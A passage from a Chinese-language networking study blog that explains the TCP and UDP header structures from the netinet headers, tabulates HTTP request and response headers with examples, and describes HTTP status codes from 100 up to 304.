<h3 id="1-3-tcp头部分析"><a href="#1-3-tcp头部分析" class="headerlink" title="1.3. tcp头部分析"></a>1.3. tcp头部分析</h3><p><strong>结构图</strong></p>
<img src="2022-04-19-06.png" />

<p><strong>wireshark抓包</strong></p>
<img src="2022-04-19-07.png" />

<p><strong>协议头文件定义</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;netinet/tcp.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * TCP header.</span></span><br><span class="line"><span class="comment"> * Per RFC 793, September, 1981.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">tcphdr</span></span><br><span class="line">  &#123;</span><br><span class="line">    __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">struct</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="type">uint16_t</span> th_sport;	<span class="comment">/* source port */</span></span><br><span class="line">	<span class="type">uint16_t</span> th_dport;	<span class="comment">/* destination port */</span></span><br><span class="line">	tcp_seq th_seq;		<span class="comment">/* sequence number */</span></span><br><span class="line">	tcp_seq th_ack;		<span class="comment">/* acknowledgement number */</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __BYTE_ORDER == __LITTLE_ENDIAN</span></span><br><span class="line">	<span class="type">uint8_t</span> th_x2:<span class="number">4</span>;	<span class="comment">/* (unused) */</span></span><br><span class="line">	<span class="type">uint8_t</span> th_off:<span class="number">4</span>;	<span class="comment">/* data offset */</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __BYTE_ORDER == __BIG_ENDIAN</span></span><br><span class="line">	<span class="type">uint8_t</span> th_off:<span class="number">4</span>;	<span class="comment">/* data offset */</span></span><br><span class="line">	<span class="type">uint8_t</span> th_x2:<span class="number">4</span>;	<span class="comment">/* (unused) */</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">uint8_t</span> th_flags;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TH_FIN	0x01</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TH_SYN	0x02</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TH_RST	0x04</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TH_PUSH	0x08</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TH_ACK	0x10</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TH_URG	0x20</span></span><br><span class="line">	<span class="type">uint16_t</span> th_win;	<span class="comment">/* window */</span></span><br><span class="line">	<span class="type">uint16_t</span> th_sum;	<span class="comment">/* checksum */</span></span><br><span class="line">	<span class="type">uint16_t</span> th_urp;	<span class="comment">/* urgent pointer */</span></span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">struct</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="type">uint16_t</span> source;</span><br><span class="line">	<span class="type">uint16_t</span> dest;</span><br><span class="line">	<span class="type">uint32_t</span> seq;</span><br><span class="line">	<span class="type">uint32_t</span> ack_seq;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __BYTE_ORDER == __LITTLE_ENDIAN</span></span><br><span class="line">	<span class="type">uint16_t</span> res1:<span class="number">4</span>;    <span class="comment">// uint16低8bit在前（0x50），对应低8bit的低4bit（0000）</span></span><br><span class="line">	<span class="type">uint16_t</span> doff:<span class="number">4</span>;    <span class="comment">// uint16低8bit在前（0x50），对应低8bit的高4bit（0101）</span></span><br><span class="line">	<span class="type">uint16_t</span> fin:<span class="number">1</span>;     <span class="comment">// uint16高8bit在后（0x10），对应高8bit的倒数第1位（0）</span></span><br><span class="line">	<span class="type">uint16_t</span> syn:<span class="number">1</span>;     <span class="comment">// uint16高8bit在后（0x10），对应高8bit的倒数第2位（0）</span></span><br><span class="line">	<span class="type">uint16_t</span> rst:<span class="number">1</span>;     <span class="comment">// uint16高8bit在后（0x10），对应高8bit的倒数第3位（0）</span></span><br><span class="line">	<span class="type">uint16_t</span> psh:<span class="number">1</span>;     <span class="comment">// uint16高8bit在后（0x10），对应高8bit的倒数第4位（0）</span></span><br><span class="line">	<span class="type">uint16_t</span> ack:<span class="number">1</span>;     <span class="comment">// uint16高8bit在后（0x10），对应高8bit的倒数第5位（1）</span></span><br><span class="line">	<span class="type">uint16_t</span> urg:<span class="number">1</span>;     <span class="comment">// uint16高8bit在后（0x10），对应高8bit的倒数第6位（0）</span></span><br><span class="line">	<span class="type">uint16_t</span> res2:<span class="number">2</span>;    <span class="comment">// uint16高8bit在后（0x10），对应高8bit的倒数第7,8位（0）</span></span><br><span class="line"><span class="meta"># <span class="keyword">elif</span> __BYTE_ORDER == __BIG_ENDIAN</span></span><br><span class="line">	<span class="type">uint16_t</span> doff:<span class="number">4</span>;</span><br><span class="line">	<span class="type">uint16_t</span> res1:<span class="number">4</span>;</span><br><span class="line">	<span class="type">uint16_t</span> res2:<span class="number">2</span>;</span><br><span class="line">	<span class="type">uint16_t</span> urg:<span class="number">1</span>;</span><br><span class="line">	<span class="type">uint16_t</span> ack:<span class="number">1</span>;</span><br><span class="line">	<span class="type">uint16_t</span> psh:<span class="number">1</span>;</span><br><span class="line">	<span class="type">uint16_t</span> rst:<span class="number">1</span>;</span><br><span class="line">	<span class="type">uint16_t</span> syn:<span class="number">1</span>;</span><br><span class="line">	<span class="type">uint16_t</span> fin:<span class="number">1</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">error</span> <span class="string">&quot;Adjust your &lt;bits/endian.h&gt; defines&quot;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">uint16_t</span> window;</span><br><span class="line">	<span class="type">uint16_t</span> check;</span><br><span class="line">	<span class="type">uint16_t</span> urg_ptr;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="2-UDP"><a href="#2-UDP" class="headerlink" title="2. UDP"></a>2. UDP</h2><h3 id="2-1-UDP头部分析"><a href="#2-1-UDP头部分析" class="headerlink" title="2.1. UDP头部分析"></a>2.1. UDP头部分析</h3><p><strong>结构图</strong></p>
<img src="2022-04-20-08.png" />

<p><strong>wireshark抓包</strong></p>
<img src="2022-04-20-09.png" />

<p><strong>协议头文件定义</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// netinet/udp.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* UDP header as specified by RFC 768, August 1980. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">udphdr</span></span><br><span class="line">&#123;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">struct</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">uint16_t</span> uh_sport;	<span class="comment">/* source port */</span></span><br><span class="line">      <span class="type">uint16_t</span> uh_dport;	<span class="comment">/* destination port */</span></span><br><span class="line">      <span class="type">uint16_t</span> uh_ulen;		<span class="comment">/* udp length */</span></span><br><span class="line">      <span class="type">uint16_t</span> uh_sum;		<span class="comment">/* udp checksum */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">uint16_t</span> source;</span><br><span class="line">      <span class="type">uint16_t</span> dest;</span><br><span class="line">      <span class="type">uint16_t</span> len;</span><br><span class="line">      <span class="type">uint16_t</span> check;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="四、应用层"><a href="#四、应用层" class="headerlink" title="四、应用层"></a>四、应用层</h1><h2 id="1-tls握手流程"><a href="#1-tls握手流程" class="headerlink" title="1. tls握手流程"></a>1. tls握手流程</h2><p>参考自 <a href="https://zhuanlan.zhihu.com/p/344086342">图解 HTTPS：RSA 握手过程</a></p>
<h2 id="2-http"><a href="#2-http" class="headerlink" title="2. http"></a>2. http</h2><h3 id="2-1-http-header"><a href="#2-1-http-header" class="headerlink" title="2.1. http header"></a>2.1. http header</h3><h4 id="1-General部分"><a href="#1-General部分" class="headerlink" title="1) General部分"></a>1) General部分</h4><table>
<thead>
<tr>
<th>Header</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>Request URL</td>
<td>请求的url</td>
<td><a href="https://www.baidu.com/home/msg/data/personalcontent?callback=jQuery1">https://www.baidu.com/home/msg/data/personalcontent?callback=jQuery1</a></td>
</tr>
<tr>
<td>Request Method</td>
<td>请求的方法，可以是GET、POST</td>
<td>GET</td>
</tr>
<tr>
<td>Status Code</td>
<td><a href="#statusCode">HTTP 状态码</a>，表示请求成功</td>
<td>200 OK</td>
</tr>
<tr>
<td>Remote Address</td>
<td>远程IP地址</td>
<td>119.75.213.61:443</td>
</tr>
<tr>
<td>Referrer Policy</td>
<td>见下文</td>
<td>unsafe-url</td>
</tr>
</tbody></table>
<h5 id="Referrer-Policy-States"><a href="#Referrer-Policy-States" class="headerlink" title="Referrer Policy States"></a>Referrer Policy States</h5><p>新的Referrer规定了五种策略：</p>
<ul>
<li>No Referrer：任何情况下都不发送Referrer信息</li>
<li>No Referrer When Downgrade：仅当协议降级（如HTTPS页面引入HTTP资源）时不发送Referrer信息。是大部分浏览器默认策略。</li>
<li>Origin Only：发送只包含host部分的referrer.</li>
<li>Origin When Cross-origin：仅在发生跨域访问时发送只包含host的Referer，同域下还是完整的。与Origin Only的区别是多判断了是否Cross-origin。协议、域名和端口都一致，浏览器才认为是同域。</li>
<li>Unsafe URL：全部都发送Referrer信息。最宽松最不安全的策略。</li>
</ul>
<h4 id="2-Requests部分"><a href="#2-Requests部分" class="headerlink" title="2) Requests部分"></a>2) Requests部分</h4><table>
<thead>
<tr>
<th>Header</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>Accept</td>
<td>指定客户端能够接收的内容类型</td>
<td>Accept: text&#x2F;plain, text&#x2F;html</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>浏览器可以接受的字符编码集。</td>
<td>Accept-Charset: iso-8859-5</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td>
<td>Accept-Encoding: compress, gzip</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>浏览器可接受的语言</td>
<td>Accept-Language: en,zh</td>
</tr>
<tr>
<td>Accept-Ranges</td>
<td>可以请求网页实体的一个或者多个子范围字段</td>
<td>Accept-Ranges: bytes</td>
</tr>
<tr>
<td>Authorization</td>
<td>HTTP授权的授权证书</td>
<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;</td>
</tr>
<tr>
<td>Cache-Control</td>
<td>指定请求和响应遵循的缓存机制</td>
<td>Cache-Control: no-cache</td>
</tr>
<tr>
<td>Connection</td>
<td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td>
<td>Connection: close</td>
</tr>
<tr>
<td>Cookie</td>
<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
<td>Cookie: $Version&#x3D;1; Skin&#x3D;new;</td>
</tr>
<tr>
<td>Content-Length</td>
<td>请求的内容长度</td>
<td>Content-Length: 348</td>
</tr>
<tr>
<td>Content-Type</td>
<td>请求的与实体对应的MIME信息</td>
<td>Content-Type: application&#x2F;x-www-form-urlencoded</td>
</tr>
<tr>
<td>Date</td>
<td>请求发送的日期和时间</td>
<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
</tr>
<tr>
<td>Expect</td>
<td>请求的特定的服务器行为</td>
<td>Expect: 100-continue</td>
</tr>
<tr>
<td>From</td>
<td>发出请求的用户的Email</td>
<td>From: <a href="mailto:&#117;&#x73;&#101;&#x72;&#x40;&#x65;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#117;&#x73;&#101;&#x72;&#x40;&#x65;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a></td>
</tr>
<tr>
<td>Host</td>
<td>指定请求的服务器的域名和端口号</td>
<td>Host: <a href="http://www.zcmhi.com/">www.zcmhi.com</a></td>
</tr>
<tr>
<td>If-Match</td>
<td>只有请求内容与实体相匹配才有效</td>
<td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td>
<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td>
<td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Range</td>
<td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td>
<td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>只在实体在指定时间之后未被修改才请求成功</td>
<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>限制信息通过代理和网关传送的时间</td>
<td>Max-Forwards: 10</td>
</tr>
<tr>
<td>Pragma</td>
<td>用来包含实现特定的指令</td>
<td>Pragma: no-cache</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>连接到代理的授权证书</td>
<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;</td>
</tr>
<tr>
<td>Range</td>
<td>只请求实体的一部分，指定范围</td>
<td>Range: bytes&#x3D;500-999</td>
</tr>
<tr>
<td>Referer</td>
<td>先前网页的地址，当前请求网页紧随其后,即来路</td>
<td>Referer: <a href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives/71.html</a></td>
</tr>
<tr>
<td>TE</td>
<td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td>
<td>TE: trailers,deflate;q&#x3D;0.5</td>
</tr>
<tr>
<td>Upgrade</td>
<td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td>
<td>Upgrade: HTTP&#x2F;2.0, SHTTP&#x2F;1.3, IRC&#x2F;6.9, RTA&#x2F;x11</td>
</tr>
<tr>
<td>User-Agent</td>
<td>User-Agent的内容包含发出请求的用户信息</td>
<td>User-Agent: Mozilla&#x2F;5.0 (Linux; X11)</td>
</tr>
<tr>
<td>Via</td>
<td>通知中间网关或代理服务器地址，通信协议</td>
<td>Via: 1.0 fred, 1.1 nowhere.com (Apache&#x2F;1.1)</td>
</tr>
<tr>
<td>Warning</td>
<td>关于消息实体的警告信息</td>
<td>Warn: 199 Miscellaneous warning</td>
</tr>
</tbody></table>
<h4 id="3-Responses-部分"><a href="#3-Responses-部分" class="headerlink" title="3) Responses 部分"></a>3) Responses 部分</h4><table>
<thead>
<tr>
<th>Header</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>Accept-Ranges</td>
<td>表明服务器是否支持指定范围请求及哪种类型的分段请求</td>
<td>Accept-Ranges: bytes</td>
</tr>
<tr>
<td>Age</td>
<td>从原始服务器到代理缓存形成的估算时间（以秒计，非负）</td>
<td>Age: 12</td>
</tr>
<tr>
<td>Allow</td>
<td>对某网络资源的有效的请求行为，不允许则返回405</td>
<td>Allow: GET, HEAD</td>
</tr>
<tr>
<td>Cache-Control</td>
<td>告诉所有的缓存机制是否可以缓存及哪种类型</td>
<td>Cache-Control: no-cache</td>
</tr>
<tr>
<td>Content-Encoding</td>
<td>web服务器支持的返回内容压缩编码类型。</td>
<td>Content-Encoding: gzip</td>
</tr>
<tr>
<td>Content-Language</td>
<td>响应体的语言</td>
<td>Content-Language: en,zh</td>
</tr>
<tr>
<td>Content-Length</td>
<td>响应体的长度</td>
<td>Content-Length: 348</td>
</tr>
<tr>
<td>Content-Location</td>
<td>请求资源可替代的备用的另一地址</td>
<td>Content-Location: &#x2F;index.htm</td>
</tr>
<tr>
<td>Content-MD5</td>
<td>返回资源的MD5校验值</td>
<td>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ&#x3D;&#x3D;</td>
</tr>
<tr>
<td>Content-Range</td>
<td>在整个返回体中本部分的字节位置</td>
<td>Content-Range: bytes 21010-47021&#x2F;47022</td>
</tr>
<tr>
<td>Content-Type</td>
<td>返回内容的MIME类型</td>
<td>Content-Type: text&#x2F;html; charset&#x3D;utf-8</td>
</tr>
<tr>
<td>Date</td>
<td>原始服务器消息发出的时间</td>
<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
</tr>
<tr>
<td>ETag</td>
<td>请求变量的实体标签的当前值</td>
<td>ETag: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>Expires</td>
<td>响应过期的日期和时间</td>
<td>Expires: Thu, 01 Dec 2010 16:00:00 GMT</td>
</tr>
<tr>
<td>Last-Modified</td>
<td>请求资源的最后修改时间</td>
<td>Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT</td>
</tr>
<tr>
<td>Location</td>
<td>用来重定向接收方到非请求URL的位置来完成请求或标识新的资源</td>
<td>Location: <a href="http://www.zcmhi.com/archives/94.html">http://www.zcmhi.com/archives/94.html</a></td>
</tr>
<tr>
<td>Pragma</td>
<td>包括实现特定的指令，它可应用到响应链上的任何接收方</td>
<td>Pragma: no-cache</td>
</tr>
<tr>
<td>Proxy-Authenticate</td>
<td>它指出认证方案和可应用到代理的该URL上的参数</td>
<td>Proxy-Authenticate: Basic</td>
</tr>
<tr>
<td>refresh</td>
<td>应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）</td>
<td>Refresh: 5; url&#x3D;<a href="http://www.zcmhi.com/archives/94.html">http://www.zcmhi.com/archives/94.html</a></td>
</tr>
<tr>
<td>Retry-After</td>
<td>如果实体暂时不可取，通知客户端在指定时间之后再次尝试</td>
<td>Retry-After: 120</td>
</tr>
<tr>
<td>Server</td>
<td>web服务器软件名称</td>
<td>Server: Apache&#x2F;1.3.27 (Unix) (Red-Hat&#x2F;Linux)</td>
</tr>
<tr>
<td>Set-Cookie</td>
<td>设置Http Cookie</td>
<td>Set-Cookie: UserID&#x3D;JohnDoe; Max-Age&#x3D;3600; Version&#x3D;1</td>
</tr>
<tr>
<td>Trailer</td>
<td>指出头域在分块传输编码的尾部存在</td>
<td>Trailer: Max-Forwards</td>
</tr>
<tr>
<td>Transfer-Encoding</td>
<td>文件传输编码</td>
<td>Transfer-Encoding:chunked</td>
</tr>
<tr>
<td>Vary</td>
<td>告诉下游代理是使用缓存响应还是从原始服务器请求</td>
<td>Vary: *</td>
</tr>
<tr>
<td>Via</td>
<td>告知代理客户端响应是通过哪里发送的</td>
<td>Via: 1.0 fred, 1.1 nowhere.com (Apache&#x2F;1.1)</td>
</tr>
<tr>
<td>Warning</td>
<td>警告实体可能存在的问题</td>
<td>Warning: 199 Miscellaneous warning</td>
</tr>
<tr>
<td>WWW-Authenticate</td>
<td>表明客户端请求实体应该使用的授权方案</td>
<td>WWW-Authenticate: Basic</td>
</tr>
</tbody></table>
<h3 id="2-2-http状态码记录"><a href="#2-2-http状态码记录" class="headerlink" title="2.2. http状态码记录"></a>2.2. <span id = "statusCode">http状态码记录</span></h3><h4 id="1xx-消息"><a href="#1xx-消息" class="headerlink" title="1xx 消息"></a>1xx 消息</h4><p>这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于 HTTP&#x2F;1.0 协议中没有定义任何 1xx 状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送 1xx 响应。</p>
<h5 id="100-Continue"><a href="#100-Continue" class="headerlink" title="100 Continue"></a>100 Continue</h5><p>客户端应当继续发送请求。这个临时响应是用来通知客户端它的部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。</p>
<h5 id="101-Switching-Protocols"><a href="#101-Switching-Protocols" class="headerlink" title="101 Switching Protocols"></a>101 Switching Protocols</h5><p>服务器已经理解了客户端的请求，并将通过Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade 消息头中定义的那些协议。</p>
<p>只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP 版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特性的资源。</p>
<h5 id="102-Processing"><a href="#102-Processing" class="headerlink" title="102 Processing"></a>102 Processing</h5><p>由WebDAV（RFC 2518）扩展的状态码，代表处理将被继续执行。</p>
<h4 id="2xx-成功"><a href="#2xx-成功" class="headerlink" title="2xx 成功"></a>2xx 成功</h4><p>这一类型的状态码，代表请求已成功被服务器接收、理解、并接受。</p>
<h5 id="200-OK"><a href="#200-OK" class="headerlink" title="200 OK"></a>200 OK</h5><p>请求已成功，请求所希望的响应头或数据体将随此响应返回。出现此状态码是表示正常状态。</p>
<h5 id="201-Created"><a href="#201-Created" class="headerlink" title="201 Created"></a>201 Created</h5><p>请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回。假如需要的资源无法及时建立的话，应当返回 ‘202 Accepted’。</p>
<h5 id="202-Accepted"><a href="#202-Accepted" class="headerlink" title="202 Accepted"></a>202 Accepted</h5><p>服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。</p>
<p>返回202状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。</p>
<h5 id="203-Non-Authoritative-Information"><a href="#203-Non-Authoritative-Information" class="headerlink" title="203 Non-Authoritative Information"></a>203 Non-Authoritative Information</h5><p>服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。例如，包含资源的元数据可能导致原始服务器知道元信息的超集。使用此状态码不是必须的，而且只有在响应不使用此状态码便会返回200 OK的情况下才是合适的。</p>
<h5 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h5><p>服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。</p>
<p>如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。</p>
<p>由于204响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。</p>
<h5 id="205-Reset-Content"><a href="#205-Reset-Content" class="headerlink" title="205 Reset Content"></a>205 Reset Content</h5><p>服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。</p>
<p>与204响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。</p>
<h5 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h5><p>服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。</p>
<p>该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。</p>
<p>响应必须包含如下的头部域：</p>
<ul>
<li>Content-Range 用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart&#x2F;byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。</li>
<li>Date</li>
<li>ETag 和&#x2F;或 Content-Location，假如同样的请求本应该返回200响应。</li>
<li>Expires, Cache-Control，和&#x2F;或 Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。<br>假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。</li>
</ul>
<p>假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。</p>
<h5 id="207-Multi-Status"><a href="#207-Multi-Status" class="headerlink" title="207 Multi-Status"></a>207 Multi-Status</h5><p>由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</p>
<h4 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx 重定向"></a>3xx 重定向</h4><p>这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的 Location 域中指明。</p>
<p>当且仅当后续的请求所使用的方法是 GET 或者 HEAD 时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A-&gt;A，或者A-&gt;B-&gt;C-&gt;A），因为这会导致服务器和客户端大量不必要的资源消耗。按照 HTTP&#x2F;1.0 版规范的建议，浏览器不应自动访问超过5次的重定向。</p>
<h5 id="300-Multiple-Choices"><a href="#300-Multiple-Choices" class="headerlink" title="300 Multiple Choices"></a>300 Multiple Choices</h5><p>被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。</p>
<p>除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616规范并没有规定这样的自动选择该如何进行。</p>
<p>如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的 URI；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。</p>
<h5 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h5><p>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。</p>
<p>新的永久性的URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。</p>
<p>如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</p>
<p>注意：对于某些使用 HTTP&#x2F;1.0 协议的浏览器，当它们发送的 POST 请求得到了一个301响应的话，接下来的重定向请求将会变成 GET 方式。</p>
<h5 id="302-Move-temporarily"><a href="#302-Move-temporarily" class="headerlink" title="302 Move temporarily"></a>302 Move temporarily</h5><p>请求的资源临时从不同的 URI响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。<br>上文有提及。</p>
<p>如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</p>
<p>注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用 GET 方式访问在 Location 中规定的 URI，而无视原先请求的方法。状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。</p>
<h5 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h5><p>对应当前请求的响应可以在另一个 URL 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。</p>
<p>注意：许多 HTTP&#x2F;1.1 版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。</p>
<h5 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h5><p>如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。</p>
<p>该响应必须包含以下的头信息：</p>
<ul>
<li>Date，除非这个服务器没有时钟。假如没有时钟的服务器也遵守这些规则，那么代理服务器以及客户端可以自行将 Date 字段添加到接收到的响应头中去（正如RFC 2068中规定的一样），缓存机制将会正常工作。</li>
<li>ETag 和&#x2F;或 Content-Location，假如同样的请求本应返回200响应。</li>
